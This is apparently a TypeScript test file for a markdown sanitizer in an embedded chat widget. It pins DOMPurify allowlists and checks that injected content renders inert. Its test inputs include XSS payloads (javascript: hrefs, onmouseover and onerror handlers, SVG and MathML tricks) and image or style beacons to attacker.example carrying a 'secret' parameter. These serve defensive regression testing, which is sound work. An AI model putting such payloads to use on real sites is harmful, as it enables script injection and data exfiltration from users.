// tests/markdown.spec.ts — Allowlist pin + behavior for the extracted markdown
// core. Created 2026-07-15 (A3 glass bar). The allowlist test PINS the exact
// DOMPurify ALLOWED_TAGS/ALLOWED_ATTR arrays — this sanitizes agent-authored
// markdown on a PUBLIC origin, so any silent change to the allowlist is an XSS
// regression and must fail here. Runs under jsdom (DOMPurify.sanitize needs a
// window).
//
// 2026-09-26 (reply links + model images): the pin used to guard against drift
// from paw-enterprise's MarkdownRenderer.svelte, whose allowlist this one was
// copied from. It no longer matches that source, on purpose: this renderer runs
// in a cross-origin iframe on a customer's page, so it drops `img` (a model-
// written image is a request fired on render, i.e. a beacon), stops passing a
// model-written `target` through (`_top` navigates the customer's whole page),
// and replaces DOMPurify's default attribute list with an explicit one (the
// defaults let `style="background:url(..)"`, `<input type=image src>` and
// `<td background>` load remote resources). The pin now guards THIS app's
// allowlist. The link/image behavior tests below were written red-first.
//
// 2026-09-26 (follow-up): site-relative links (`/returns`, `returns`) resolve
// against the host page origin handed in via setLinkBase() at boot, instead of
// becoming dead text; an invalid/missing origin keeps dropping them. And
// `input` survives only as a disabled checkbox (the GFM task-list case).
//
// 2026-09-26 (security review): C1 regression — tables used to be wrapped by a
// regex over the SANITIZED string, and a `<table` inside a title attribute got
// the wrapper spliced into it, reopening a live <table onmouseover>. Tests
// re-parse the output and assert nothing carries an on* attribute. Also pinned:
// no `title`, data-*/aria-* off, fragment/query-only hrefs dropped, equivalent
// origins (`:443`) accepted, SVG/MathML and removal-order payloads.
import { describe, it, expect, afterEach } from 'vitest';
import {
  MARKDOWN_ALLOWED_TAGS,
  MARKDOWN_ALLOWED_ATTR,
  renderMarkdown,
  parseSegments,
  setLinkBase,
  MARKDOWN_PURIFY_FLAGS,
} from '../src/lib/markdown';

function dom(html: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host;
}

describe('DOMPurify allowlist (pinned; diverges from paw-enterprise on purpose)', () => {
  it('pins the exact ALLOWED_TAGS set (no img: model output must not load images)', () => {
    expect(MARKDOWN_ALLOWED_TAGS).toEqual([
      'p', 'br', 'strong', 'em', 'del', 'a', 'ul', 'ol', 'li',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'code', 'pre', 'hr', 'sup', 'sub', 'span', 'div',
      'input',
    ]);
  });

  it('pins the exact ALLOWED_ATTR set (no target/rel/style/src; the link hook owns target+rel)', () => {
    expect(MARKDOWN_ALLOWED_ATTR).toEqual([
      'href', 'align', 'start', 'type', 'disabled', 'checked', 'colspan', 'rowspan', 'scope',
    ]);
  });

  it('pins data-* and aria-* off', () => {
    expect(MARKDOWN_PURIFY_FLAGS).toEqual({ ALLOW_DATA_ATTR: false, ALLOW_ARIA_ATTR: false });
    const html = renderMarkdown('<span data-x="1" aria-hidden="true" aria-label="Pay here">s</span>');
    expect(html).not.toMatch(/data-x|aria-/);
  });

  it('has no script/style/iframe/form/svg/img in the allowlist', () => {
    for (const forbidden of ['script', 'style', 'iframe', 'form', 'svg', 'object', 'embed', 'link', 'img']) {
      expect(MARKDOWN_ALLOWED_TAGS as readonly string[]).not.toContain(forbidden);
    }
  });
});

describe('reply links leave the widget, never the customer page', () => {
  for (const target of ['_top', '_parent', '_self']) {
    it(`rewrites an injected target="${target}" to _blank + noopener`, () => {
      const html = renderMarkdown(
        `<a href="https://evil.example" target="${target}" rel="opener">Returns policy</a>`,
      );
      const a = dom(html).querySelector('a')!;
      expect(a).not.toBeNull();
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    });
  }

  it('gives a plain markdown link target=_blank + noopener', () => {
    const a = dom(renderMarkdown('[Returns](https://site.example/returns)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://site.example/returns');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });

  for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)']) {
    it(`drops a ${href.slice(0, 10)} href entirely`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['/returns', '//evil.example/x', 'ftp://files.example/x', 'data:text/html,hi']) {
    it(`drops a non-allowlisted href (${href})`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  for (const href of ['mailto:help@site.example', 'tel:+15551234567', 'http://site.example/x']) {
    it(`keeps an allowlisted href (${href})`, () => {
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.getAttribute('href')).toBe(href);
      expect(a.getAttribute('target')).toBe('_blank');
    });
  }
});

describe('model output cannot load remote resources', () => {
  it('a markdown image renders no <img> (alt text only)', () => {
    const html = renderMarkdown('See ![our <b>logo</b>](https://attacker.example/p?d=secret) here');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(dom(html).textContent).toContain('our <b>logo</b>');
  });

  it('a linked image degrades to a normal link around the alt text', () => {
    const a = dom(renderMarkdown('[![Logo](https://x.example/l.png)](https://site.example)')).querySelector('a')!;
    expect(a.textContent).toBe('Logo');
    expect(a.getAttribute('href')).toBe('https://site.example');
  });

  it('raw <img src> HTML renders no <img>', () => {
    const html = renderMarkdown('<img src="https://attacker.example/p?d=secret" alt="x">');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('strips a style url() beacon', () => {
    const html = renderMarkdown('<span style="background:url(https://attacker.example/s)">s</span>');
    expect(html).not.toContain('attacker.example');
  });

  it('strips an <input type=image src> beacon', () => {
    const html = renderMarkdown('<input type="image" src="https://attacker.example/i">');
    expect(html).not.toContain('attacker.example');
  });

  it('strips a <td background> beacon', () => {
    const html = renderMarkdown('<table><tr><td background="https://attacker.example/t">c</td></tr></table>');
    expect(html).not.toContain('attacker.example');
  });

  it('still renders GFM task checkboxes, table alignment and ordered-list start', () => {
    const tasks = dom(renderMarkdown('- [x] done\n- [ ] todo'));
    expect(tasks.querySelectorAll('input[type="checkbox"]').length).toBe(2);
    expect(tasks.querySelector('input[checked]')).not.toBeNull();
    expect(renderMarkdown('| a |\n|:-|\n| 1 |')).toContain('align="left"');
    expect(renderMarkdown('3. three\n4. four')).toContain('start="3"');
  });
});

// Re-parse the output the way {@html} will and look for anything live.
function assertInert(html: string): HTMLElement {
  const host = dom(html);
  for (const el of host.querySelectorAll('*')) {
    for (const attr of el.getAttributeNames()) {
      expect(attr.toLowerCase().startsWith('on'), `${el.tagName} has ${attr}`).toBe(false);
    }
    const href = el.getAttribute('href') ?? el.getAttribute('xlink:href') ?? '';
    expect(href.toLowerCase()).not.toContain('javascript:');
    if (el.hasAttribute('target')) expect(el.getAttribute('target')).toBe('_blank');
  }
  return host;
}

describe('table wrapping cannot break open an attribute (C1)', () => {
  const payloads = [
    '<a title="<table onmouseover=alert(1) tabindex=0 autofocus onfocus=alert(2) x=">T</a>',
    '[x](https://a.example "<table onmouseover=alert(1) x=")',
    '<a href="https://a.example" title="</table><img src=x onerror=alert(3)>">T</a>',
    // Rides in HREF, which stays allowed — so this one still guards the DOM
    // wrap on its own even with `title` gone from the allowlist.
    '<a href="https://a.example/?<table onmouseover=alert(1) x=">T</a>',
  ];
  for (const p of payloads) {
    it(`stays inert: ${p.slice(0, 40)}`, () => {
      const host = assertInert(renderMarkdown(p));
      expect(host.querySelector('table'), 'title text became a table').toBeNull();
      expect(host.querySelector('img')).toBeNull();
    });
  }

  it('still wraps a real table for mobile scroll', () => {
    const host = dom(renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |'));
    const table = host.querySelector('table')!;
    expect(table.parentElement!.className).toBe('pawbar-table-wrapper');
    expect(host.querySelectorAll('.pawbar-table-wrapper').length).toBe(1);
  });

  it('wraps two tables separately', () => {
    const host = dom(renderMarkdown('| a |\n| - |\n| 1 |\n\ntext\n\n| b |\n| - |\n| 2 |'));
    const wrappers = host.querySelectorAll('.pawbar-table-wrapper');
    expect(wrappers.length).toBe(2);
    for (const w of wrappers) expect(w.children.length).toBe(1);
  });
});

describe('foreign-content and removal-order payloads (pinned)', () => {
  for (const p of [
    '<svg><a target="_top" href="https://evil.example">x</a></svg>',
    '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<math><mi><a target="_top" href="https://evil.example">x</a></mi></math>',
  ]) {
    it(`stays inert: ${p}`, () => {
      const host = assertInert(renderMarkdown(p));
      expect(host.querySelector('svg, math')).toBeNull();
    });
  }

  it('an input removed between two links does not skip the second link', () => {
    const host = assertInert(
      renderMarkdown('<a href="https://a.example" target="_top">1</a><input type="text"><a href="https://b.example" target="_top">2</a>'),
    );
    const links = host.querySelectorAll('a');
    expect(links.length).toBe(2);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
    expect(host.querySelector('input')).toBeNull();
  });
});

describe('task-list inputs only', () => {
  it('keeps a GFM task checkbox, disabled', () => {
    const inputs = dom(renderMarkdown('- [x] done\n- [ ] todo')).querySelectorAll('input');
    expect(inputs.length).toBe(2);
    for (const i of inputs) {
      expect(i.getAttribute('type')).toBe('checkbox');
      expect(i.hasAttribute('disabled')).toBe(true);
    }
  });

  it('forces disabled onto a raw checkbox that lacks it', () => {
    const i = dom(renderMarkdown('<input type="checkbox">')).querySelector('input')!;
    expect(i.hasAttribute('disabled')).toBe(true);
  });

  for (const raw of [
    '<input type="text" value="card number">',
    '<input type="password">',
    '<input>',
    '<input type="submit" value="Pay">',
    '<input type="hidden" value="x">',
  ]) {
    it(`removes a non-checkbox input (${raw})`, () => {
      expect(dom(renderMarkdown(raw)).querySelector('input')).toBeNull();
    });
  }
});

describe('site-relative links resolve against the host page origin', () => {
  afterEach(() => setLinkBase(null));

  it('resolves a root-relative link against parentOrigin', () => {
    setLinkBase('https://shop.example');
    const a = dom(renderMarkdown('[Returns](/returns)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://shop.example/returns');
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('resolves a plain-relative link against parentOrigin', () => {
    setLinkBase('https://shop.example');
    const a = dom(renderMarkdown('[Returns](returns?x=1#faq)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://shop.example/returns?x=1#faq');
  });

  for (const href of ['//evil.example/x', '/\\evil.example/x', '\\\\evil.example/x', 'ftp://x.example', 'javascript:alert(1)']) {
    it(`still drops ${href} even with a base`, () => {
      setLinkBase('https://shop.example');
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  it('leaves absolute links alone when a base is set', () => {
    setLinkBase('https://shop.example');
    const a = dom(renderMarkdown('[x](https://other.example/p)')).querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://other.example/p');
  });

  for (const href of ['#faq', '?q=1', '']) {
    it(`drops a fragment/query-only/empty href (${JSON.stringify(href)}) instead of pointing at the home page`, () => {
      setLinkBase('https://shop.example');
      const a = dom(renderMarkdown(`<a href="${href}">x</a>`)).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }

  for (const ok of ['https://shop.example:443', 'https://shop.example/', 'http://localhost:5173']) {
    it(`normalises an equivalent origin (${ok})`, () => {
      setLinkBase(ok);
      const a = dom(renderMarkdown('[Returns](/returns)')).querySelector('a')!;
      expect(a.getAttribute('href')).toBe(new URL('/returns', ok).href);
    });
  }

  for (const bad of ['*', '', 'not a url', 'https://shop.example/path', 'https://shop.example/?q=1', 'https://shop.example/#x', 'javascript:alert(1)', 'file:///etc']) {
    it(`drops relative links when parentOrigin is invalid (${JSON.stringify(bad)})`, () => {
      setLinkBase(bad);
      const a = dom(renderMarkdown('[Returns](/returns)')).querySelector('a')!;
      expect(a.hasAttribute('href')).toBe(false);
    });
  }
});

describe('renderMarkdown sanitization', () => {
  it('strips a script tag from agent markdown', () => {
    const html = renderMarkdown('Hello <script>alert(1)</script> world');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('alert(1)');
  });

  it('strips inline event handlers and javascript: hrefs', () => {
    const html = renderMarkdown('<a href="javascript:alert(1)" onclick="steal()">x</a>');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('javascript:');
  });

  it('renders gfm tables wrapped for mobile scroll', () => {
    const html = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(html).toContain('<table');
    expect(html).toContain('pawbar-table-wrapper');
  });

  it('keeps basic emphasis + links', () => {
    const html = renderMarkdown('**bold** and [link](https://example.com)');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com"');
  });
});

describe('parseSegments', () => {
  it('splits prose and a fenced code block', () => {
    const segs = parseSegments('Try this:\n```js\nconst x = 1;\n```\nDone.');
    expect(segs.map((s) => s.type)).toEqual(['html', 'code', 'html']);
    const code = segs.find((s) => s.type === 'code');
    expect(code && 'code' in code && code.code).toContain('const x = 1;');
    expect(code && 'lang' in code && code.lang).toBe('js');
  });

  it('masks an in-flight unclosed fence while streaming', () => {
    const segs = parseSegments('Here is code:\n```python\nprint(', true);
    expect(segs.map((s) => s.type)).toEqual(['html', 'code-loading']);
  });

  it('does not mask the unclosed fence when not streaming', () => {
    const segs = parseSegments('Here is code:\n```python\nprint(', false);
    expect(segs.some((s) => s.type === 'code-loading')).toBe(false);
  });
});
